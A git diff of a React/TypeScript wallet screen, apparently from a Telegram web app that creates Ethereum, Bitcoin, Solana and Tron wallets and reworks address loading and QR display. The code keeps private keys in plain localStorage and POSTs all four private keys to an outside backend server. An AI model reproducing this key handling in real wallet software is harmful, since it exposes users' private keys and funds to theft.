@@ -9,6 +9,7 @@ import * as multichainWallet from 'multichain-crypto-wallet';
 import { BsHouse, BsWallet2, BsShop, BsLightningCharge, BsCashStack, BsCopy, BsQrCode } from "react-icons/bs";
 import { id } from "ethers";
 import { error } from "node:console";
+import axios from "axios";
  
 const StyledApp = styled.div`
   background-color: #F9F9F9;
@@ -52,24 +53,20 @@ border-radius:7px;
 
 
 function Register() {
-
   
-    const [EthereumWalletAddress, setEthereumWalletAddress] = useState('');
+  
+   const [EthereumWalletAddress, setEthereumWalletAddress] = useState('');
     const [BitcoinWalletAddress, setBitcoinWalletAddress] = useState('');
     const [SolanaWalletAddress, setSolanaWalletAddress] = useState('');
     const [tronWalletAddress,  setTronWalletAddress]= useState('');
 
-    //backend req
-    async function alreadyExists (){
-      const response = await fetch("https://twa-backend-g83o.onrender.com/wallets");
-      const data = await response.json();
-      setEthereumWalletAddress(data.addresses[0]);
-      setBitcoinWalletAddress(data.addresses[1]);
-      setSolanaWalletAddress(data.addresses[2]);
-      setTronWalletAddress(data.addresses[3]);
-     }
 
-     //wallet creation
+    var ethAddress = localStorage.getItem('ethereumWallet') as string;
+        var bitAddress = localStorage.getItem('bitcoinWallet') as string;
+        var solAddress = localStorage.getItem('solanaWallet')as string;
+        var tronAddress = localStorage.getItem('tronWallet') as string;
+
+      //wallet creation
     const createWallets = async () => {
       const bitcoinWallet = multichainWallet.createWallet({ network: 'bitcoin' });
         const ethereumWallet = multichainWallet.createWallet({ network: "ethereum" });
@@ -81,17 +78,21 @@ function Register() {
         
           const tronWallet = await tronWeb.createAccount();
 
-      console.log(tronWallet.privateKey);
-      
-        setBitcoinWalletAddress(bitcoinWallet.address);
-        setEthereumWalletAddress(ethereumWallet.address);
-        setSolanaWalletAddress(solanaWallet.address);
-
         // Save wallet addresses to local storage as a fallback
         localStorage.setItem('ethereumWallet', ethereumWallet.address);
         localStorage.setItem('bitcoinWallet', bitcoinWallet.address);
         localStorage.setItem('solanaWallet', solanaWallet.address);
         localStorage.setItem('tronWallet', tronWallet.address.base58);
+
+        const ethAddress = localStorage.getItem('ethereumWallet') as string;
+        const bitAddress = localStorage.getItem('bitcoinWallet')as string;
+        const solAddress = localStorage.getItem('solanaWallet')as string;
+        const tronAddress = localStorage.getItem('tronWallet')as string;
+
+        setBitcoinWalletAddress( bitAddress );
+        setEthereumWalletAddress(ethAddress);
+        setSolanaWalletAddress(solAddress );
+        setTronWalletAddress(tronAddress);
  //private keys
        localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey) ;
        localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey) ;
@@ -109,61 +110,149 @@ function Register() {
         const    btck= bitcoinWallet.privateKey as string;
         const     solK= solanaWallet.privateKey  as string;
         const   tronK =  tronWallet.privateKey as string;
+
+
     try{
       const p_k = [ethk, btck, solK,  tronK]; 
         const Address =  [ethAdd, bitAdd, solAdd, tronAdd] ;
-     await   fetch("https://twa-backend-g83o.onrender.com/wallets", {
+        const res = await   fetch("https://twa-backend-g83o.onrender.com/wallets", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           credentials: "include",  
-          body: JSON.stringify({ P_k: p_k, addresses: Address }),
+          body: JSON.stringify({  p_k, Address }),
       })
+      const responseData = await res.json();
+      console.log(responseData.walletId)
+      const saveWalletIdToIndexedDB = ( ) => {
+        const walletId = responseData.walletId;
+      
+        const request = indexedDB.open('WalletDatabase', 1);
+      
+        request.onupgradeneeded = (event) => {
+          const db = event.target ? (event.target as IDBOpenDBRequest).result : null;
+          if (!db) {
+            console.error('Failed to access IndexedDB result.');
+            return;
+          }
+      
+          if (!db.objectStoreNames.contains('wallets')) {
+            db.createObjectStore('wallets', { keyPath: 'id' });
+          }
+        };
+      
+        request.onsuccess = (event) => {
+          const db = event.target ? (event.target as IDBOpenDBRequest).result : null;
+          if (!db) {
+            console.error('Failed to access IndexedDB result.');
+            return;
+          }
+          const tx = db.transaction('wallets', 'readwrite');
+          const store = tx.objectStore('wallets');
+      
+          store.put({ id: 'latest', walletId: walletId });
+      
+          tx.oncomplete = () => {
+            console.log('✅ Wallet ID saved to IndexedDB:', walletId);
+          };
+      
+          tx.onerror = (err) => {
+            console.error('❌ Error saving wallet ID:', err);
+          };
+        };
+      
+        request.onerror = (err) => {
+          console.error('❌ Error opening IndexedDB:', err);
+        };
+        
+      };
+      saveWalletIdToIndexedDB();
     }
        
     catch  {
       console.error('failed to post request ');
   } 
-    };
+  
+    };   
+
+    //backend req
+    async function alreadyExists (){
+      if (ethAddress && bitAddress && solAddress && tronAddress) {
+        
+        setBitcoinWalletAddress( bitAddress );
+        setEthereumWalletAddress(ethAddress);
+        setSolanaWalletAddress(solAddress );
+        setTronWalletAddress(tronAddress);
+        }
+else{
+        try {
+
+          const getWalletIdFromIndexedDB = (): Promise<string | null> => {
+            return new Promise((resolve, reject) => {
+              const request = indexedDB.open('WalletDatabase', 1);
+          
+              request.onsuccess = (event) => {
+                const db = (event.target as IDBOpenDBRequest).result;
+                const tx = db.transaction('wallets', 'readonly');
+                const store = tx.objectStore('wallets');
+                const getRequest = store.get('latest');
+          
+                getRequest.onsuccess = () => {
+                  if (getRequest.result) {
+                    const walletId = getRequest.result.walletId;
+                    console.log('✅ Retrieved Wallet ID:', walletId);
+                    resolve(walletId);
+                  } else {
+                    resolve(null); // Nothing saved
+                  }
+                };
+          
+                getRequest.onerror = () => reject('❌ Failed to retrieve wallet ID');
+              };
+          
+              request.onerror = () => reject('❌ Failed to open IndexedDB');
+            });
+          };
+          
+          
+  const walletId = await getWalletIdFromIndexedDB();
+  if (!walletId) throw new Error('Wallet ID not found in IndexedDB');
+
+  const response = await fetch(`https://twa-backend-g83o.onrender.com/wallets/${walletId}`, {
+    method: "GET",
+    headers: { "Content-Type": "application/json" },
+    credentials: "include"
+  });
+
+  if (!response.ok) {
+    throw new Error(`Error: ${response.status} ${response.statusText}`);
+  }
+ 
+            const data = await response.json();
+            
+            setBitcoinWalletAddress(data.addresses[0]);
+        setEthereumWalletAddress(data.addresses[1]);
+        setSolanaWalletAddress(data.addresses[2]);
+        setTronWalletAddress(data.addresses[3]);
+
+        localStorage.setItem('ethereumWallet', data.addresses[1]);
+        localStorage.setItem('bitcoinWallet', data.addresses[0]);
+        localStorage.setItem('solanaWallet', data.addresses[2]);
+        localStorage.setItem('tronWallet', data.addresses[3]);
+
+        } catch (err) {
+            console.error("Failed to fetch wallets:", err);
+        }
+     } }
+
+     useEffect(() => {
+         alreadyExists();
+     }, []);
    
-    const ethAddress = localStorage.getItem('ethereumWallet') as string;
-    const bitAddress = localStorage.getItem('bitcoinWallet') as string;
-    const solAddress = localStorage.getItem('solanaWallet') as string;
-    const tronAddress = localStorage.getItem('tronWallet') as string;
-    const makewall = () => {
-        // Load wallet addresses from local storage
-        const ethAddress = localStorage.getItem('ethereumWallet');
-        const bitAddress = localStorage.getItem('bitcoinWallet');
-        const solAddress = localStorage.getItem('solanaWallet');
-        const tronAddress = localStorage.getItem('tronWallet');
-
-        
-
-        
-        
-        if (ethAddress) {
-            setEthereumWalletAddress(ethAddress);
-        } else {
-            createWallets();
-             // Create wallets only if they do not exist in storage
-        }
-        if (bitAddress ) {
-          setBitcoinWalletAddress(bitAddress);
-      } else {
-          createWallets(); // Create wallets only if they do not exist in storage
-      }
-        if (solAddress) {
-            setSolanaWalletAddress(solAddress);
-        } else {
-            createWallets(); // Create wallets only if they do not exist in storage
-        }
-        if (tronAddress){
-          setTronWalletAddress(tronAddress);
-          } else {
-            createWallets(); 
-          }
-        
-    }// Run this effect only once
-    
+   
+     ethAddress = localStorage.getItem('ethereumWallet') as string;
+     bitAddress = localStorage.getItem('bitcoinWallet')as string;
+     solAddress = localStorage.getItem('solanaWallet')as string;
+     tronAddress = localStorage.getItem('tronWallet')as string;
 
  
  
@@ -274,6 +363,11 @@ function Register() {
 
     }
     const showQR  = ()=>{
+      const sectionQR = document.getElementById('qr') as HTMLElement | null;
+      if (sectionQR != null && sectionQR.style.display == 'none') {
+        sectionQR.style.display = 'block'; 
+    
+    } 
       const section = document.getElementById('QRcodeChoice') as HTMLElement | null;
     if (section != null) {
       const selectedValue = (section as HTMLSelectElement).value; // Access the value of the selected option
@@ -311,29 +405,27 @@ function Register() {
     if (section != null && section.style.display == 'block') {
       section.style.display = 'none'; 
   
-  } else if(section != null && section.style.display == 'none') {
-    section.style.display = 'block';
-  }
+  } 
   };
  
     return (
-        <StyledApp> 
-            <AppContainer  onClick={onMouseLeave}> 
+        <StyledApp  > 
+            <AppContainer  > 
             <div   style={{position: 'absolute', left: '85%', height:'34.5px'  }}> <select id="QRcodeChoice" style={{height:'34.5px', background:'transparent', border:'none', color:'gray', fontFamily:'Lexend'}}  onChange={showQR}   >
               <option  value="eth">eth</option>
               <option  value="btc">btc</option>
               <option value="sol">sol</option>
               <option  value="trx">trx</option>
               </select></div>
-              <div id="qr" style={{display:'block '}} >
+              <div id="qr" style={{display:'none '}}>
             <div id="QRcode1"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
             <div id="QRcode2"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
             <div id="QRcode3"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
             <div id="QRcode4"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
             </div>
-              <div style={{right:'0'}}><Button onClick={alreadyExists}  >Import  wallet</Button> <Button onClick={makewall}  >Create new   </Button>  <Button onClick={showQR}><BsQrCode/></Button></div>
+              <div style={{right:'0'}}><Button onClick={alreadyExists}  >Import  wallet</Button> <Button onClick={createWallets}  >Create new   </Button>  <Button onClick={showQR}><BsQrCode/></Button></div>
               <br/>
-            <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
+            <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }} onMouseEnter={onMouseLeave}>
                     <div>
                         <img src='https://i.imgur.com/sSYmdfQ.png' alt='bitcoin' style={{ width: '40px', height: '40px' }} />
                     </div>
